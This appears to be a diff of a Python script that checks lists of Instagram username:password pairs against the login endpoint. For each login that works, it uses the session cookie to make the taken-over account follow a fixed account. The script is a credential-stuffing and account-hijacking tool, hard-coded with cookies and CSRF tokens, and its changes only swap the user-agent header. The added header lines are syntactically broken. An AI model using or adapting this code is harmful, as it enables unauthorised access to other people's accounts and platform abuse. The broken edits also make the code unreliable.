@@ -2,7 +2,7 @@ import  sys, os, random, time, user_agent
 import os,sys
 import subprocess
 from bs4 import BeautifulSoup
-import json, requests, user_agent,os ,sys, time, datetime,wget
+import json, requests, os, sys, time, datetime
 import requests
 from user_agent import generate_user_agent
 from datetime import datetime
@@ -122,9 +122,8 @@ def lwla():
 		for line in file:
 			user=line.split(':')[0]
 			pasw=line.split(':')[1]
-			useragent=generate_user_agent()
 			url = 'https://www.instagram.com/accounts/login/ajax/'
-			head = {'accept':'*/*','accept-encoding':'gzip,deflate,br','accept-language':'en-US,en;q=0.9,ar;q=0.8','content-length':'269','content-type':'application/x-www-form-urlencoded','cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-','origin':'https://www.instagram.com','referer':'https://www.instagram.com/','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent': str(useragent),'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','x-instagram-ajax':'8a8118fa7d40','x-requested-with':'XMLHttpRequest'}
+			head = {'accept':'*/*','accept-encoding':'gzip,deflate,br','accept-language':'en-US,en;q=0.9,ar;q=0.8','content-length':'269','content-type':'application/x-www-form-urlencoded','cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-','origin':'https://www.instagram.com','referer':'https://www.instagram.com/','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent': 'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)','x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','x-instagram-ajax':'8a8118fa7d40','x-requested-with':'XMLHttpRequest'}
 			time_now = int(datetime.now().timestamp())
 			data = {'username': user,'enc_password': "#PWD_INSTAGRAM_BROWSER:0:"+str(time_now)+":"+str(pasw),'queryParams': {},'optIntoOneTap': 'false',}
 			try:
@@ -149,7 +148,7 @@ def lwla():
 					os.system(oss)
 					print(logo2)
 					cook = login.cookies['sessionid']
-					hedDLT = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-45no7B-A6FA-6F83AD1717DE; ig_nrcb=1; csrftoken=wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi; ds_user_id=46165248972; sessionid='+cook,'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/_papulakam__0/follow/','sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': str(useragent),'x-csrftoken': 'wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgYkq','x-instagram-ajax': '753ce878cd6d','x-requested-with': 'XMLHttpRequest'}
+					hedDLT = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-45no7B-A6FA-6F83AD1717DE; ig_nrcb=1; csrftoken=wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi; ds_user_id=46165248972; sessionid='+cook,'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/_papulakam__0/follow/','sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)','x-csrftoken': 'wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgYkq','x-instagram-ajax': '753ce878cd6d','x-requested-with': 'XMLHttpRequest'}
 					data_get_info = {'__a': '1'}
 					urll = 'https://www.instagram.com/web/friendships/44727257007/follow/'
 					try:requests.post(urll,headers=hedDLT)
@@ -217,9 +216,8 @@ def lwla():
 		for line in file:
 			user=line.split(':')[0]
 			pasw=line.split(':')[1]
-			useragent=generate_user_agent()
 			url = 'https://www.instagram.com/accounts/login/ajax/'
-			head = {'accept':'*/*','accept-encoding':'gzip,deflate,br','accept-language':'en-US,en;q=0.9,ar;q=0.8','content-length':'269','content-type':'application/x-www-form-urlencoded','cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-','origin':'https://www.instagram.com','referer':'https://www.instagram.com/','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent': str(useragent),'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','x-instagram-ajax':'8a8118fa7d40','x-requested-with':'XMLHttpRequest'}
+			head = {'accept':'*/*','accept-encoding':'gzip,deflate,br','accept-language':'en-US,en;q=0.9,ar;q=0.8','content-length':'269','content-type':'application/x-www-form-urlencoded','cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-','origin':'https://www.instagram.com','referer':'https://www.instagram.com/','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent': 'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)','x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','x-instagram-ajax':'8a8118fa7d40','x-requested-with':'XMLHttpRequest'}
 			time_now = int(datetime.now().timestamp())
 			urll = 'https://www.instagram.com/web/friendships/44727257007/follow/'
 			data = {'username': user,'enc_password': "#PWD_INSTAGRAM_BROWSER:0:"+str(time_now)+":"+str(pasw),'queryParams': {},'optIntoOneTap': 'false',}
@@ -245,7 +243,7 @@ def lwla():
 					os.system(oss)
 					print(logo2)
 					cook = login.cookies['sessionid']
-					hedDLT = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-45no7B-A6FA-6F83AD1717DE; ig_nrcb=1; csrftoken=wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi; ds_user_id=46165248972; sessionid='+cook,'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/_papulakam__0/follow/','sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': str(useragent),'x-csrftoken': 'wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgYkq','x-instagram-ajax': '753ce878cd6d','x-requested-with': 'XMLHttpRequest'}
+					hedDLT = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-45no7B-A6FA-6F83AD1717DE; ig_nrcb=1; csrftoken=wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi; ds_user_id=46165248972; sessionid='+cook,'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/_papulakam__0/follow/','sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)','x-csrftoken': 'wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgYkq','x-instagram-ajax': '753ce878cd6d','x-requested-with': 'XMLHttpRequest'}
 					data_get_info = {'__a': '1'}
 					urll = 'https://www.instagram.com/web/friendships/44727257007/follow/'
 					try:requests.post(urll,headers=hedDLT)
